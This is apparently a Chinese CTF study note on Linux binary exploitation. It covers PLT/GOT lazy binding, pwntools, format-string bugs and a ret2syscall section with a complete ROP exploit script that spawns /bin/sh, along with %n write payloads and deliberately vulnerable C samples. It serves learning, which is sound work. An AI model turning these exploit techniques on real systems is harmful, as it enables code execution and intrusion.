# 基础知识

:star:ESP、EBP谁是栈顶谁是栈底

:star:这两个栈指针寄存器，谁会经常改变？

:star:他为什么会经常变？不经常变的那一个有什么作用？

:star:call一个函数地址时候发生了哪些事情？

:star:main() ---> vuln() ----> gets() 你通过gets溢出，覆盖的是谁的返回地址，返回到哪里？

:star:push和pop用基本汇编指令怎么解释？

:star:ret指令用基本汇编指令怎么解释？leave ret呢？

:star:Intel汇编和AT&T汇编区别是什么？

:star:程序链接libc的机制

简单栈溢出：

Ubuntu 16/18 不含有栈对齐机制，无需再次调试栈空间

大量的标准函数/常用函数 --- 》库函数 --- > 将标准函数不封装在程序里，降低程序体积

如何修改程序链接的libc

```
ldd pwn
```

# 3-got-plt

要说这个，就要提到 Linux的动态链接了。

## 3.1-Linux动态链接

用人话说一下就是：

> in
> 静态链接就是，直接从库里面把函数扒出来，加到代码里进行编译。
> 动态链接不同，他只用一些符号代替函数，当需要调用他的时候，他再去库里面现找。

还不理解？👴给你小刀拉屁股（开开眼：

> 看着这张图，这叫静态链接：
> [![god](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/27285_god.jpg)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/27285_god.jpg)
> 再看这张图，这就叫动态链接：
> [图片](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/27285_god.jpg)

## 3.2-PLT&GOT

linux下的动态链接是通过PLT&GOT来实现的，这里做一个实验，通过这个实验来理解：
使用如下源代码 test.c：

```
C
#include <stdio.h>
void print_banner()
{
    printf("Shangu is very handsome!\n");
}
int main(void)
{
    print_banner();
    return 0;
}
```

依次使用下列命令进行编译：

```
BASH
gcc -no-pie -Wall -g -o test.o -c test.c -m32
gcc -no-pie -o test test.o -m32
```

参数详解：

> **-c**：只激活预处理,编译,和汇编,也就是他只把程序做成obj文件
> **-o**：制定目标名称, 默认的时候, gcc 编译出来的文件是 a.out, 很难听, 改掉它, 哈哈。
> **-g**：只是编译器，在编译的时候，产生调试信息。
> **-Wall**：生成所有警告信息。
> **-no-pie**: 关闭 PIE 方便我们调试，要不然出来反汇编全是下图这样的 寄存器而不是具体地址
> **-M intel**：这是 objdump 的参数，也写在这里。chumen👴说要看intel风格的汇编，另一个风 格就是下图那些，寄存器前面会加 % 等一些奇怪的东西。

通过 `objdump -d test.o` 可以查看反汇编：[![image-20211006212101180](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/92965_image-20211006212101180.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/92965_image-20211006212101180.png)

printf() 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf() 函数先用 `fc ff ff ff` 也就是有符号数的 `-4` 代替。

运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段。
那么是怎么找到真是地址的呢？
已经编译好的程序，调用 `printf` 的时候，链接器会额外生成一小段代码，通过这段代码来获取 printf() 的地址，像下面这样，进行链接的时候只需要对`printf_stub()` 进行重定位操作就可以。

```
CODE
.text
...

// 调用printf的call指令
call printf_stub
...
printf_stub:
    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址
    jmp rax // 跳过去执行printf函数

.data
...
printf函数的储存地址,这里储存printf函数重定位后的地址
```

总结一下：动态链接每个函数需要两个东西：

> **1、用来存放外部函数地址的数据段**
> **2、用来获取数据段记录的外部函数地址的代码**

刚好有两个表实现了这两个要求，就是我们搞不懂的 `got` 和 `plt`：

存放外部的函数地址的数据表称为**全局偏移表**（**GOT**, Global Offset Table），
存放额外代码的表称为**程序链接表**（**PLT**，Procedure Link Table）

### 讲人话环节：

编译好的程序里面并没有 `printf` 的代码，需要去外部找。但是动态链接是不能提前知道真实地址的。然后链接器会生成一段代码用来获取 `printf` 的地址。要实现这个功能，就需要一个存储这些寻址代码的数据表，还需要一个存储着所有外置函数地址的表。他们分别是 `PLT` 和 `GOT`。

> [![gggggg](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/34547_gggggg.jpeg)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/34547_gggggg.jpeg)可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址

那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制

## 3.3-延迟绑定

只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：

```
CODE
//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址
void printf@plt()
{
address_good:
    jmp *printf@got        //这句代码只有在调用到该函数才会执行，初始化时候执行的下一句
 	jmp lookup_printf      //首先跳转到查找地址的地方，需要他的时候在执行上一条
lookup_printf:
    调用重定位函数查找 printf 地址，并写到 printf@got
	goto address_good;//再返回去执行address_good
}
```

说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf() 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到printf 来执行了

### 讲人话环节

> 为了节省资源，一开始是不进行重定向的，太多函数太麻烦。而是执行上述函数中的 `lookup_printf`先查找到 `printf` 的地址，然后写入到 `*printf@got` 。当程序执行到需要用 `printf` 函数的时候，才回去执行`jmp *printf@got` 。这样设计能节省资源
>
> 如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了

### “ 找 ” 地址的实现原理

通过 `objdump -M intel -d test > test.asm` 可以看到其中 plt 表项有三条指令：

```
CODE
080482d0 <.plt>:
 80482d0:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 80482d6:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 80482dc:	00 00                	add    BYTE PTR [eax],al
	...

080482e0 <puts@plt>:
 80482e0:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 80482e6:	68 00 00 00 00       	push   0x0
 80482eb:	e9 e0 ff ff ff       	jmp    80482d0 <.plt>

080482f0 <__libc_start_main@plt>:
 80482f0:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 80482f6:	68 08 00 00 00       	push   0x8
 80482fb:	e9 d0 ff ff ff       	jmp    80482d0 <.plt>
```

其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0

我们来调试看一下这些地址里面都存的啥：
先 `gdb test` 然后 `b main`，再 `run`， 再 `x/x jmp的那个地址` 就可以看了

[![image-20211006233214785](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/10966_image-20211006233214785.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/10966_image-20211006233214785.png)

很明显了，首先跳到 got 地址，got地址中存储着，公共plt地址，公共plt跳转到 lookup功能的地址。
Look up 实现的代码：

```
CODE
80482e6: push   0x0            //将数据压到栈上，作为将要执行的函数的参数
80482eb: jmp    80482d0 <.plt> //去到了公共plt表
```

然后就是第一个plt表项的内容：

```
CODE
080482d0 <.plt>:
push   DWORD PTR ds:0x804a004  //将数据压到栈上，作为后面函数的参数
jmp    DWORD PTR ds:0x804a008  //跳转到函数
add    BYTE PTR [eax],al
```

跳转过去的地址是：

[![image-20211006233854266](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/77692_image-20211006233854266.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/77692_image-20211006233854266.png)

`_dl_runtime_resolve`的作用就是查找 `printf` 的地址。

## 3.4-总结and疑问

程序如果调用的函数没有被调用过，那么我们想要调用他，就要经过这几步：

> xxx@plt -> xxx@got -> xxx@pl -> 公共@plt -> _dl_runtime_resolve

**那么问题也就来了**：

1. _dl_runtime_resolve 是怎么知道要查找 printf 函数的
2. _dl_runtime_resolve 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项

### Answer-1：

> 在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的 id，告诉了 _dl_runtime_resolve 要去找哪一个函数的地址
>
> 在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 `readelf -r test` 命令可以查看 test 可执行文件中的重定位信息
> [![image-20211006234456442](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/89063_image-20211006234456442.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/89063_image-20211006234456442.png)
> 我直接从大佬博客找了个中文版界面，对着看一下：
> [![zwb](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/21123_zwb.png)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/06/21123_zwb.png)

看大佬博客说的是，push进去的操作数是和这个偏移量相同的。
但是我实调结果却是不一样的。
这个问题留着以后研究。

### Answer-2：

看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址

> 在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：
> **got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址**
> **got [1]：本 ELF 的 link_map 数据结构描述符地址**
> **got [2]：_dl_runtime_resolve 函数的地址**
> 动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项

## 3.5-完整流程总结

第一次调用：
[![got1](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/07/67421_got1.jpeg)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/07/67421_got1.jpeg)

第二次调用：

[![got2](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/07/21192_got2.jpeg)](https://cdn.jsdelivr.net/gh/shanguwei/CDN@latest/img/2021/10/07/21192_got2.jpeg)

# 4-pwntools

## 4.1-pwntools常用模块：

> - asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台
> - dynelf : 用于远程符号泄漏，需要提供leak方法
> - elf : 对elf文件进行操作
> - gdb : 配合gdb进行调试
> - memleak : 用于内存泄漏
> - shellcraft : shellcode的生成器
> - tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE
> - utils : 一些实用的小功能，例如CRC计算，cyclic pattern等

除了我们常用的交互模块，也可以使用listen来开启一个本地的监听端口：

```
PYTHON
l = listen()
r = remote('localhost', l.lport)
c = l.wait_for_connection()
r.send('hello')
c.recv()
'hello'
```

## 4.2-交互函数：

> - interactive() : 直接进行交互，相当于回到shell的模式，在取得shell之后使用
> - recv(numb=4096, timeout=default) : 接收指定字节
> - recvall() : 一直接收直到EOF
> - recvline(keepends=True) : 接收一行，keepends为是否保留行尾的\n
> - recvuntil(delims, drop=False) : 一直读到delims的pattern出现为止
> - recvrepeat(timeout=default) : 持续接受直到EOF或timeout
> - send(data) : 发送数据
> - sendline(data) : 发送一行数据，相当于在数据末尾加\n

## 4.3-汇编反汇编

使用asm来进行汇编:

```
PYTHON
>>> asm('nop')
'\x90'
>>> asm('nop', arch='arm')
'\x00\xf0 \xe3'
```

注意，asm需要binutils中的as工具辅助，如果是不同于本机平台的其他平台的汇编，例如在我的x86机器上进行mips的汇编就会出现as工具未找到的情况，这时候需要安装其他平台的cross-binutils。
可以使用context来指定cpu类型以及操作系统：

```
PYTHON
context(os='linux',arch='i386',endian='little',word_size='32',log_level='debug')
```

使用disasm进行反汇编:

```
PYTHON
>>> print disasm('6a0258cd80ebf9'.decode('hex'))
   0:   6a 02                   push   0x2
   2:   58                      pop    eax
   3:   cd 80                   int    0x80
   5:   eb f9                   jmp    0x0
```

## 4.4-Shellcode生成器

使用 shellcraft 可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到

```
PYTHON
>>> print shellcraft.i386.nop().strip('\n')
    nop
>>> print shellcraft.i386.linux.sh()
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
```

如上所示，如果需要在64位的Linux上执行`/bin/sh`就可以使用`shellcraft.amd64.linux.sh()`，配合asm函数就能够得到最终的pyaload了。

除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等。

## 4.5-ELF文件操作

> - asm(address, assembly) : 在指定地址进行汇编
> - bss(offset) : 返回bss段的位置，offset是偏移值
> - checksec() : 对elf进行一些安全保护检查，例如NX, PIE等。
> - disasm(address, n_bytes) : 在指定位置进行n_bytes个字节的反汇编
> - offset_to_vaddr(offset) : 将文件中的偏移offset转换成虚拟地址VMA
> - vaddr_to_offset(address) : 与上面的函数作用相反
> - read(address, count) : 在address(VMA)位置读取count个字节
> - write(address, data) : 在address(VMA)位置写入data
> - section(name) : dump出指定section的数据

elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置。

```
PYTHON
elf = ELF('/bin/cat')
print hex(elf.address)  # 文件装载的基地址
print hex(elf.symbols['write']) # 函数地址
print hex(elf.got['write']) # GOT表的地址
print hex(elf.plt['write']) # PLT的地址
```

甚至可以修改一个ELF的代码

```
PYTHON
elf = ELF('/bin/cat')
elf.read(elf.address+1, 3)
elf.asm(elf.address, 'ret')
elf.save('/tmp/quiet-cat')
disasm(file('/tmp/quiet-cat','rb').read(1))
'   0:   c3                      ret'
```

## 4.6-ROP链生成器

ROP模块的作用，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。

```
PYTHON
elf = ELF('ropasaurusrex')
rop = ROP(elf)
rop.read(0, elf.bss(0x80))
rop.dump()
# ['0x0000:        0x80482fc (read)',
#  '0x0004:       0xdeadbeef',
#  '0x0008:              0x0',
#  '0x000c:        0x80496a8']
str(rop)
# '\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08'
```

使用`ROP(elf)`来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数。

因为ROP对象实现了`__getattr__`的功能，可以直接通过func call的形式来添加函数，`rop.read(0, elf.bss(0x80))`实际相当于`rop.call('read', (0, elf.bss(0x80)))`。 通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。

> - call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)
> - chain() : 返回当前的字节序列，即payload
> - dump() : 直观地展示出当前的rop chain
> - raw() : 在rop chain中加上一个整数或字符串
> - search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget，没仔细研究过
> - unresolve(value) : 给出一个地址，反解析出符号

## 4.7-数据处理

对于整数的**pack**与数据的**unpack**，可以使用`p32`,`p64`,`u32`,`u64`这些函数，分别对应着32位和64位的整数。

## 5-格式化字符串漏洞

#### 漏洞机制

[![image-20211001173454719](http://image.shangu127.top/img/2021/10/01/68157_image-20211001173454719.png)](http://image.shangu127.top/img/2021/10/01/68157_image-20211001173454719.png)

```
C
printf("name:%s,num:%d",a); //这是正常情况下的printf函数，里面的%d就是格式化字符
printf(a);     //这样书写就存在格式化字符漏洞。
```

简单的解释就是，printf 函数会默认读取 “ name:%s,num:%d ” 作为格式化字符串。如果里面没有%的话就正常输出。如果里面含有 % 那就按照对应的格式去后面寻找参数。

> %c：输出字符，配上%n可用于向指定地址写数据。
>
> %d：输出十进制整数，配上%n可用于向指定地址写数据。
>
> %x：输出16进制数据，如%i表示要泄漏偏移处字节长的进制数据，x表示要泄漏偏移i处4字节长的16进制数据，lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。
>
> %p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。
>
> %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。
>
> %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10表示将写入偏移处保存的指针所指向的地址（字节），而n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而hn表示写入的地址空间为2字节，%表示写入的地址空间为字节，hhn表示写入的地址空间为1字节，lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%或hn或hhn来适时调整。
>
> %n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。

更巧的是即便后面的参数不够，他也能继续输出。这就给了我们利用的漏洞。
举一个简单的例子：
执行指令编译以下代码，如果编译报错，说明你的gcc不是完整的，不支持编译32位程序，执行下面的指令安装gcc插件。

```
BASH
gcc -m32 -fno-stack-protector -no-pie -o fs1 string.c
sudo apt-get install gcc-multilib
C
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```

gdb调试一下就会发现，他会继续输出栈的信息。

[![image-20211001194419712](http://image.shangu127.top/img/2021/10/01/29083_image-20211001194419712.png)](http://image.shangu127.top/img/2021/10/01/29083_image-20211001194419712.png)

这样我们就可以利用 “ %n ” 这个格式化字符对栈进行修改。

在开始的时候，我们是已知存放 a1 地址的，也就是程序最早输出的位置。
我们只需要计算出输出信息在栈中的偏移量，就可以对栈进行精准制导了。
如果还不理解原理的话，回头仔细看看 %n 的作用。

[![image-20211001203033509](http://image.shangu127.top/img/2021/10/01/74870_image-20211001203033509.png)](http://image.shangu127.top/img/2021/10/01/74870_image-20211001203033509.png)

我直接手动测试 a1 位置，输入十个 “ %p_ ”，在结果里找一下这俩：

> secret[0] is 604260
> secret[1] is 604264
>
> 测试指令：给v2赋值1，这样好找，然后输入大量 %p
>
> [![image-20211001203258635](http://image.shangu127.top/img/2021/10/01/40355_image-20211001203258635.png)](http://image.shangu127.top/img/2021/10/01/40355_image-20211001203258635.png)

数一下一共六个数据，实际上就是那六个寄存器。偏移量就是 “ 7 ”。
知道偏移量以后，就可以直接在 v2 中输入要修改数据的地址。然后利用 %n 进行修改。
payload大概就长这样：

```
PYTHON
v2 = str(604260)
payload = %85d%7$n
```

#### 解题工具

pwntools自带了一个构造格式化字符串溢出payload的函数：fmstr

```python
payload = fmtstr_payload(11,{num_adr:0x4})
```

文档如下：

```python
class FmtStr(object):

    def __init__(self, execute_fmt, offset=None, padlen=0, numbwritten=0):
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten

        if self.offset is None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = {}
        self.leaker = MemLeak(self._leaker)

	...

```

execute_fmt, 交互函数
offset(=None), 第一个格式化程序的偏移量
padlen(=0), payload之前填充的字节数
numbwritten(=0), 已写入的字节数

```python
def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_max='long', overflows=16, strategy="small", badbytes=frozenset(), offset_bytes=0):
    sz = WRITE_SIZE[write_size]
    szmax = WRITE_SIZE[write_size_max]
    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)

    fmt = b""
    for _ in range(1000000):
        data_offset = (offset_bytes + len(fmt)) // context.bytes
        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten)
        fmt = fmt + cyclic((-len(fmt)-offset_bytes) % context.bytes)

        if len(fmt) + offset_bytes == data_offset * context.bytes:
            break
    else:
        raise RuntimeError("this is a bug ... format string building did not converge")

    return fmt + data

```

offset, 第一个格式化程序的偏移量
writes, 往addr里写入value值
numbwritten=0, 已经由printf写入的字节数
write_size=‘byte’, 指定逐byte/short/int写

## ret2syscall

这类题目没有 `system ()` 这类的函数，而且我们也不能在栈上执行我们的 **shellcode**，也就是说我们之前学到的 **ret2text** 和 **ret2shellcode**都不能用。
所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用[系统调用](https://blog.csdn.net/sinat_26227857/article/details/44244433)。

需要我们自己构造 rop链。**32位**的 `syscall` 需要准备以下条件：

> 🔑系统调用号，即 `eax` 应该为 **0xb** 64位是0x3b
> 🔑第一个参数，即 `ebx` 应该指向 **/bin/sh** 的地址，其实执行 sh 的地址也可以。
> 🔑第二个参数，即 `ecx` 应该为 **0**
> 🔑第三个参数，即 `edx` 应该为 **0**

但是这个题是 64位的程序，与32位还是有很大区别的：

> **系统调用号**不同.比如**x86**中 `sys_write` 是 4 ，`sys_exit` 是 1；
> 而x86_64`sys_write` 是 1 , `sys_exit` 是 60。
> 系统调用所使用的寄存器不同，**x86**中使用与 eax 对应的 rax 传递系统调用号，但是 **x86_64**中分别使用 rdi/rsi/rdx 传递前三个参数，而不是 **x86** 中的 ebx/ecx/edx。
> 系统调用使用 “ `syscall` ” 而不是 “ `int 80` ”

所以我们需要做的一共有这几件事：

> 1、将 rax 赋值为 0x3b （sys_execve函数
> 2、将我们写入的 “ /bin/sh ” 地址写入 rdi （第一个参数
> 3、将 rsi 和 rdx 置 0

利用ROPgadget获取我们需要的地址：

```
BASH
ROPgadget --binary ./pwn10 --only "pop|ret" |grep "rax" 
//0x41f884
ROPgadget --binary ./pwn10 --only "pop|ret" |grep "rdi"
//0x4016e6
ROPgadget --binary ./pwn10 --only "pop|ret" |grep "rdx"
//0x442d16
ROPgadget --binary ./pwn10 --only "pop|ret" |grep "rsi"
//0x401807
```

代码模板：

```python
PYTHON
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
shangu = 0

def main():
	if shangu == 1:
		io = remote("",)
	else:
		io = process("pwn10")
	
	pop_rax = 0x41f884
	pop_rdi = 0x4016e6
	pop_rsi = 0x401807
	pop_rdx = 0x442d16
	shell_adr = 0x006cc000 
	syscall_adr = 0x440415
	mov_rsi_rax = 0x474821
	pop_rsi_rdx = 0x442d39
	
	payload = 112*'a'+p64(0)+p64(pop_rax)+'/bin/sh\x00'+p64(pop_rsi)+p64(shell_adr)+p64(mov_rsi_rax)+p64(pop_rax)+p64(0x3b)+p64(pop_rdi)+p64(shell_adr)+p64(pop_rsi_rdx) + p64(0)+p64(0)+p64(syscall_adr)
	
	 
	io.sendline(payload)
	io.interactive()

main()
```



## 沙箱保护

使用checksec检查常规保护机制，使用以下指令检查沙箱规则：

```bash
seccomp-tools dump ./pwn
```

沙箱规则会禁止进行某些系统调用